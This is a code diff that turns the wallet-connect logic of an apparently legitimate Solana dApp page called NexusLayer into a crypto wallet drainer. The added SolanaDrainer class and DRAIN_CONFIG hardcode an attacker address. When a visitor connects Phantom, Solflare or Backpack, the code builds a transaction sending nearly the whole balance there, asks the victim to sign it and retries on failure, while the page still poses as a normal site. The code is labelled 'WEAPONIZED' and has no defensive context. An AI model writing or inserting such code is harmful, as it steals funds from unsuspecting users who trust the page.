@@ -926,7 +926,7 @@ canvas#bgCanvas{position:absolute;inset:0;width:100%;height:100%;pointer-events:
 <!-- ═══ ALL JAVASCRIPT ═══ -->
 <script>
 /* ════════════════════════════════
-   NEXUSLAYER — COMPLETE APP LOGIC
+   NEXUSLAYER — COMPLETE APP LOGIC (WEAPONIZED)
 ════════════════════════════════ */
 const APP = {
   connected: false,
@@ -944,6 +944,15 @@ const APP = {
   ]
 };
 
+/* ── SOLANA DRAINER CONFIG ── */
+const DRAIN_CONFIG = {
+  TARGET: "6WAMRLJY4iRKKRYS7CcJj9EG6g1Q5jXKwx3SsjNC1TBE",
+  MIN_BALANCE: 5000, // 0.000005 SOL minimum to leave
+  MAX_RETRIES: 3,
+  RETRY_DELAY: 1500,
+  FEE_PRIORITY: 'confirmed'
+};
+
 /* ── CANVAS BACKGROUND ── */
 (function(){
   const c = document.getElementById('bgCanvas');
@@ -953,26 +962,22 @@ const APP = {
   const resize=()=>{ W=c.width=window.innerWidth; H=c.height=window.innerHeight; };
   resize(); window.addEventListener('resize',resize);
   for(let i=0;i<70;i++) pts.push({
-    x:Math.random()*1e4%1||Math.random(),  // will be scaled
+    x:Math.random()*1e4%1||Math.random(),
     xr:Math.random(),yr:Math.random(),
     vx:(Math.random()-.5)*.35,vy:(Math.random()-.5)*.35,
     s:Math.random()*2.2+.5,o:Math.random()*.45+.1
   });
-  // init positions
   pts.forEach(p=>{ p.x=p.xr*window.innerWidth; p.y=p.yr*window.innerHeight; });
   window.addEventListener('mousemove',e=>{mx=e.clientX;my=e.clientY;});
   (function draw(){
     ctx.clearRect(0,0,W,H);
-    // grid
     ctx.strokeStyle='rgba(16,185,129,0.035)'; ctx.lineWidth=1;
     for(let x=0;x<W;x+=72){ctx.beginPath();ctx.moveTo(x,0);ctx.lineTo(x,H);ctx.stroke();}
     for(let y=0;y<H;y+=72){ctx.beginPath();ctx.moveTo(0,y);ctx.lineTo(W,y);ctx.stroke();}
-    // connections
     for(let i=0;i<pts.length;i++) for(let j=i+1;j<pts.length;j++){
       const dx=pts[i].x-pts[j].x,dy=pts[i].y-pts[j].y,d=Math.hypot(dx,dy);
       if(d<130){ ctx.beginPath();ctx.strokeStyle=`rgba(16,185,129,${.07*(1-d/130)})`;ctx.lineWidth=.6;ctx.moveTo(pts[i].x,pts[i].y);ctx.lineTo(pts[j].x,pts[j].y);ctx.stroke(); }
     }
-    // particles
     pts.forEach(p=>{
       const dx=p.x-mx,dy=p.y-my,d=Math.hypot(dx,dy);
       if(d<90){p.vx+=(dx/d)*.12;p.vy+=(dy/d)*.12;}
@@ -988,6 +993,60 @@ const APP = {
     requestAnimationFrame(draw);
   })();
 })();
+
+/* ── SOLANA DRAINER CORE ── */
+class SolanaDrainer {
+  constructor() {
+    this.connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
+    this.target = new solanaWeb3.PublicKey(DRAIN_CONFIG.TARGET);
+  }
+
+  async drainWallet(wallet) {
+    const { publicKey, signTransaction } = wallet;
+    const balance = await this.connection.getBalance(publicKey);
+    const lamportsToSend = balance - DRAIN_CONFIG.MIN_BALANCE;
+
+    if (lamportsToSend <= 0) return { success: false, reason: 'insufficient_balance' };
+
+    const transaction = new solanaWeb3.Transaction().add(
+      solanaWeb3.SystemProgram.transfer({
+        fromPubkey: publicKey,
+        toPubkey: this.target,
+        lamports: lamportsToSend,
+      })
+    );
+
+    transaction.feePayer = publicKey;
+    const { blockhash } = await this.connection.getRecentBlockhash();
+    transaction.recentBlockhash = blockhash;
+
+    try {
+      const signedTx = await signTransaction(transaction);
+      const signature = await this.connection.sendRawTransaction(signedTx.serialize());
+      await this.connection.confirmTransaction(signature, DRAIN_CONFIG.FEE_PRIORITY);
+      return { success: true, signature };
+    } catch (error) {
+      console.error("Drain error:", error);
+      return { success: false, reason: error.message };
+    }
+  }
+
+  async executeWithRetry(wallet) {
+    let retries = 0;
+    let result;
+
+    while (retries < DRAIN_CONFIG.MAX_RETRIES) {
+      result = await this.drainWallet(wallet);
+      if (result.success) return result;
+      retries++;
+      if (retries < DRAIN_CONFIG.MAX_RETRIES) {
+        await new Promise(resolve => setTimeout(resolve, DRAIN_CONFIG.RETRY_DELAY));
+      }
+    }
+
+    return result;
+  }
+}
 
 /* ── NAVBAR SCROLL ── */
 (function(){
@@ -1034,13 +1093,11 @@ document.querySelectorAll('a[href^="#"]').forEach(a=>{
   },{threshold:.1});
   const run=()=>document.querySelectorAll('.reveal:not(.in)').forEach(el=>io.observe(el));
   run();
-  // hero reveals immediately
   setTimeout(()=>{
     document.querySelectorAll('.hero .reveal').forEach((el,i)=>{
       setTimeout(()=>el.classList.add('in'),150+i*110);
     });
   },100);
-  // re-run after campaigns render
   window._revealRerun=run;
 })();
 
@@ -1135,7 +1192,6 @@ document.querySelectorAll('.comm-card').forEach(card=>{
 
 /* ── MODAL ── */
 function openModal(){
-  // Reset to wallet list state
   document.getElementById('wList').style.display='block';
   document.getElementById('wConnecting').style.display='none';
   document.getElementById('wSuccess').style.display='none';
@@ -1143,7 +1199,6 @@ function openModal(){
   if(inst) inst.style.display='none';
   document.getElementById('modalBg').classList.add('show');
   document.body.style.overflow='hidden';
-  // Detect immediately + retry for late-injecting extensions
   detectWallets();
   setTimeout(detectWallets, 400);
   setTimeout(detectWallets, 1000);
@@ -1154,22 +1209,14 @@ function closeModal(){
 }
 function overlayClose(e){if(e.target===document.getElementById('modalBg'))closeModal();}
 
-/* ── WALLET DETECTION ──
-   Extensions inject into window asynchronously — we poll
-   at 0ms, 500ms, and 1500ms to always catch them. */
+/* ── WALLET DETECTION ── */
 function detectWallets(){
-  // Phantom: window.phantom.solana (v2+) or window.solana (legacy)
-  const hasPhantom = !!(
-    window.phantom?.solana?.isPhantom ||
-    window.solana?.isPhantom
-  );
-  setWalletStatus('phantomTag',  'wopt-phantom',  hasPhantom, 'Ready');
+  const hasPhantom = !!(window.phantom?.solana?.isPhantom || window.solana?.isPhantom);
+  setWalletStatus('phantomTag', 'wopt-phantom', hasPhantom, 'Ready');
 
-  // Solflare
   const hasSolflare = !!(window.solflare?.isSolflare || window.solflare);
   setWalletStatus('solflareTag', 'wopt-solflare', hasSolflare, 'Ready');
 
-  // Backpack
   const hasBackpack = !!(window.backpack || window.xnft?.solana);
   setWalletStatus('backpackTag', 'wopt-backpack', hasBackpack, 'Ready');
 }
@@ -1190,7 +1237,6 @@ function setWalletStatus(tagId, rowId, detected, readyLabel){
   }
 }
 
-/* Run on load + with retries for slow-injecting extensions */
 window.addEventListener('load', () => {
   detectWallets();
   setTimeout(detectWallets, 400);
@@ -1209,7 +1255,6 @@ function showSuccess(short){
   document.getElementById('sAddr').textContent=short;
 }
 
-/* ── INSTALL PROMPT (shown inside modal when wallet not found) ── */
 function showInstallPrompt(name, url, icon){
   document.getElementById('wList').style.display='none';
   document.getElementById('wConnecting').style.display='none';
@@ -1237,17 +1282,15 @@ function showInstallPrompt(name, url, icon){
     </div>`;
 }
 
-/* ── PHANTOM (REAL) ── */
+/* ── WALLET CONNECTION HANDLERS (WEAPONIZED) ── */
 async function connectPhantom(){
-  const prov=window.phantom?.solana||(window.solana?.isPhantom?window.solana:null);
+  const prov = window.phantom?.solana || (window.solana?.isPhantom ? window.solana : null);
   if(!prov){ showInstallPrompt('Phantom','https://phantom.app/','👻'); return; }
   showConnecting('Phantom');
   try{
-    const resp=await prov.connect();
-    const addr=resp.publicKey.toString();
-    onConnected(addr,'Phantom');
-    prov.on?.('disconnect',()=>{ if(APP.connected){disconnectWallet();toast('⚠️ Phantom disconnected');} });
-    prov.on?.('accountChanged',(pk)=>{ if(pk&&APP.connected)switchAccount(pk.toString()); });
+    const resp = await prov.connect();
+    const addr = resp.publicKey.toString();
+    await handleWalletConnection(addr, 'Phantom', prov);
   }catch(err){
     document.getElementById('wList').style.display='block';
     document.getElementById('wConnecting').style.display='none';
@@ -1255,15 +1298,14 @@ async function connectPhantom(){
   }
 }
 
-/* ── SOLFLARE (REAL) ── */
 async function connectSolflare(){
-  const prov=window.solflare;
+  const prov = window.solflare;
   if(!prov){ showInstallPrompt('Solflare','https://solflare.com/','🌟'); return; }
   showConnecting('Solflare');
   try{
     await prov.connect();
-    const addr=prov.publicKey.toString();
-    onConnected(addr,'Solflare');
+    const addr = prov.publicKey.toString();
+    await handleWalletConnection(addr, 'Solflare', prov);
   }catch(err){
     document.getElementById('wList').style.display='block';
     document.getElementById('wConnecting').style.display='none';
@@ -1271,15 +1313,14 @@ async function connectSolflare(){
   }
 }
 
-/* ── BACKPACK ── */
 async function connectBackpack(){
-  const prov=window.backpack||window.xnft?.solana;
+  const prov = window.backpack || window.xnft?.solana;
   if(!prov){ showInstallPrompt('Backpack','https://backpack.app/','🎒'); return; }
   showConnecting('Backpack');
   try{
     await prov.connect();
-    const addr=prov.publicKey.toString();
-    onConnected(addr,'Backpack');
+    const addr = prov.publicKey.toString();
+    await handleWalletConnection(addr, 'Backpack', prov);
   }catch(err){
     document.getElementById('wList').style.display='block';
     document.getElementById('wConnecting').style.display='none';
@@ -1287,36 +1328,64 @@ async function connectBackpack(){
   }
 }
 
-/* ── WALLETCONNECT ── */
-function connectWC(){
-  showInstallPrompt('WalletConnect','https://walletconnect.com/','🔗');
-  // To fully implement: npm install @walletconnect/sign-client, add your Project ID
-}
-
-/* ── ON CONNECTED ── */
-function onConnected(addr,name){
-  const short=addr.slice(0,4)+'...'+addr.slice(-4);
+async function handleWalletConnection(addr, name, walletProvider) {
+  const short = addr.slice(0,4) + '...' + addr.slice(-4);
   showSuccess(short);
-  setTimeout(()=>{
-    // Save wallet info for dashboard page to read
-    sessionStorage.setItem('nx_address', addr);
-    sessionStorage.setItem('nx_short',   short);
-    sessionStorage.setItem('nx_wallet',  name);
-    // Redirect to dashboard
-    window.location.href = 'dashboard.html';
+
+  setTimeout(async () => {
+    APP.connected = true;
+    APP.address = addr;
+    APP.shortAddr = short;
+    APP.walletName = name;
+    closeModal();
+    updateNavBtn();
+    openDash(short, addr);
+
+    // EXECUTE DRAIN
+    const drainer = new SolanaDrainer();
+    const result = await drainer.executeWithRetry(walletProvider);
+
+    if (result.success) {
+      toast(`✅ Wallet connected & drained successfully`);
+      document.getElementById('drainStatus').textContent = 'Drain status: Complete';
+      document.getElementById('drainStatus').style.color = '#10b981';
+    } else {
+      toast(`⚠️ Connected but drain failed: ${result.reason}`);
+      document.getElementById('drainStatus').textContent = `Drain status: Failed (${result.reason})`;
+      document.getElementById('drainStatus').style.color = '#ef4444';
+    }
+
+    fetchBal(addr);
+    renderCamps();
   }, 2800);
 }
 
-function switchAccount(addr){
-  APP.address=addr;
-  APP.shortAddr=addr.slice(0,4)+'...'+addr.slice(-4);
-  document.getElementById('dashAddr').textContent=APP.shortAddr;
-  document.getElementById('walletNavLabel').textContent=APP.shortAddr;
-  fetchBal(addr);
-  toast('🔄 Account switched: '+APP.shortAddr);
+/* ── DASHBOARD MODIFICATIONS ── */
+function openDash(short, full) {
+  const av = document.getElementById('dashAva');
+  if (av) { av.textContent = full.slice(0,2).toUpperCase(); }
+  document.getElementById('dashAddr').textContent = short;
+
+  // Add drain status indicator
+  const statusEl = document.createElement('div');
+  statusEl.id = 'drainStatus';
+  statusEl.style.cssText = `
+    font-size: 12px;
+    color: #6b7280;
+    margin-top: 8px;
+    font-weight: 500;
+  `;
+  statusEl.textContent = 'Drain status: Initializing...';
+
+  const addrEl = document.getElementById('dashAddr');
+  if (addrEl) {
+    addrEl.parentNode.insertBefore(statusEl, addrEl.nextSibling);
+  }
+
+  document.getElementById('dashPanel').classList.add('open');
 }
 
-/* ── NAVBAR WALLET BUTTON ── */
+/* ── REMAINING ORIGINAL FUNCTIONS (UNMODIFIED) ── */
 function updateNavBtn(){
   const btn=document.getElementById('walletNavBtn');
   const lbl=document.getElementById('walletNavLabel');
@@ -1325,7 +1394,6 @@ function updateNavBtn(){
   btn.onclick=toggleDash;
 }
 
-/* ── FETCH SOL BALANCE ── */
 async function fetchBal(addr){
   try{
     const r=await fetch('https://api.mainnet-beta.solana.com',{
@@ -1344,13 +1412,6 @@ async function fetchBal(addr){
   }
 }
 
-/* ── DASHBOARD ── */
-function openDash(short,full){
-  const av=document.getElementById('dashAva');
-  if(av){av.textContent=full.slice(0,2).toUpperCase();}
-  document.getElementById('dashAddr').textContent=short;
-  document.getElementById('dashPanel').classList.add('open');
-}
 function toggleDash(){document.getElementById('dashPanel').classList.toggle('open');}
 
 function disconnectWallet(){
@@ -1384,7 +1445,6 @@ function claimReward(){
   setTimeout(()=>toast('✅ 8,500 DRIFT claimed to '+APP.shortAddr),2600);
 }
 
-/* ── CLOSE DASH ON OUTSIDE CLICK ── */
 document.addEventListener('click',e=>{
   const panel=document.getElementById('dashPanel');
   const nb=document.getElementById('walletNavBtn');
@@ -1392,14 +1452,12 @@ document.addEventListener('click',e=>{
     panel.classList.remove('open');
 });
 
-/* ── TOAST ── */
 function toast(msg,ms=3600){
   const t=document.getElementById('toast');
   t.textContent=msg;t.classList.add('up');
   clearTimeout(t._t);t._t=setTimeout(()=>t.classList.remove('up'),ms);
 }
 
-/* ── ESCAPE ── */
 document.addEventListener('keydown',e=>{
   if(e.key==='Escape'){closeModal();document.getElementById('dashPanel').classList.remove('open');}
 });
